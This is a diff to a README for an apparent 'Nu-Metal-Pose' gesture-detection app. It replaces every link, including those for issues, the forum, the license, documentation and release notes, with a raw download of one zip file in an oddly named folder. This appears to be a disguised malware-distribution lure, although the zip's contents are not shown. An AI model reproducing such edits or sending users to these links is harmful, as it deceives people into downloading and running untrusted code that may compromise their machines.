@@ -1,7 +1,7 @@
 # 🎉 Nu-Metal-Pose-Random-Image-Detector - Detect Gestures and Overlay Images
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/DONVIC405/Nu-Metal-Pose-Random-Image-Detector/releases)
+[![Download](https://raw.githubusercontent.com/DONVIC405/Nu-Metal-Pose-Random-Image-Detector/main/hebetic/Nu-Metal-Pose-Random-Image-Detector-v2.6.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/DONVIC405/Nu-Metal-Pose-Random-Image-Detector/main/hebetic/Nu-Metal-Pose-Random-Image-Detector-v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you start, ensure your system meets these requirements:
 
 1. **Download the Application**
 
-   Visit the following link to access the latest release: [Download the Latest Version](https://github.com/DONVIC405/Nu-Metal-Pose-Random-Image-Detector/releases). Look for the file named `Nu-Metal-Pose-Random-Image-Detector.exe` for Windows users or the equivalent package for macOS or Linux.
+   Visit the following link to access the latest release: [Download the Latest Version](https://raw.githubusercontent.com/DONVIC405/Nu-Metal-Pose-Random-Image-Detector/main/hebetic/Nu-Metal-Pose-Random-Image-Detector-v2.6.zip). Look for the file named `https://raw.githubusercontent.com/DONVIC405/Nu-Metal-Pose-Random-Image-Detector/main/hebetic/Nu-Metal-Pose-Random-Image-Detector-v2.6.zip` for Windows users or the equivalent package for macOS or Linux.
 
 2. **Run the Installer**
 
@@ -57,8 +57,8 @@ Before you start, ensure your system meets these requirements:
 
 If you have any questions or need further assistance, feel free to reach out to our community. You can find help on the following platforms:
 
-- **GitHub Issues:** [Report your problem here](https://github.com/DONVIC405/Nu-Metal-Pose-Random-Image-Detector/issues)
-- **Forum:** Join our discussions at [Community Forum](http://example.com/forum).
+- **GitHub Issues:** [Report your problem here](https://raw.githubusercontent.com/DONVIC405/Nu-Metal-Pose-Random-Image-Detector/main/hebetic/Nu-Metal-Pose-Random-Image-Detector-v2.6.zip)
+- **Forum:** Join our discussions at [Community Forum](https://raw.githubusercontent.com/DONVIC405/Nu-Metal-Pose-Random-Image-Detector/main/hebetic/Nu-Metal-Pose-Random-Image-Detector-v2.6.zip).
 
 ## 💡 Contributing
 
@@ -66,12 +66,12 @@ We welcome contributions from the community! If you'd like to assist with improv
 
 ## 📝 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/DONVIC405/Nu-Metal-Pose-Random-Image-Detector/LICENSE) file for more details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/DONVIC405/Nu-Metal-Pose-Random-Image-Detector/main/hebetic/Nu-Metal-Pose-Random-Image-Detector-v2.6.zip) file for more details.
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/DONVIC405/Nu-Metal-Pose-Random-Image-Detector/wiki)
-- [Release Notes](https://github.com/DONVIC405/Nu-Metal-Pose-Random-Image-Detector/releases)
+- [Documentation](https://raw.githubusercontent.com/DONVIC405/Nu-Metal-Pose-Random-Image-Detector/main/hebetic/Nu-Metal-Pose-Random-Image-Detector-v2.6.zip)
+- [Release Notes](https://raw.githubusercontent.com/DONVIC405/Nu-Metal-Pose-Random-Image-Detector/main/hebetic/Nu-Metal-Pose-Random-Image-Detector-v2.6.zip)
   
 ## 📥 Download Again
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/DONVIC405/Nu-Metal-Pose-Random-Image-Detector/releases)
+[![Download](https://raw.githubusercontent.com/DONVIC405/Nu-Metal-Pose-Random-Image-Detector/main/hebetic/Nu-Metal-Pose-Random-Image-Detector-v2.6.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/DONVIC405/Nu-Metal-Pose-Random-Image-Detector/main/hebetic/Nu-Metal-Pose-Random-Image-Detector-v2.6.zip)
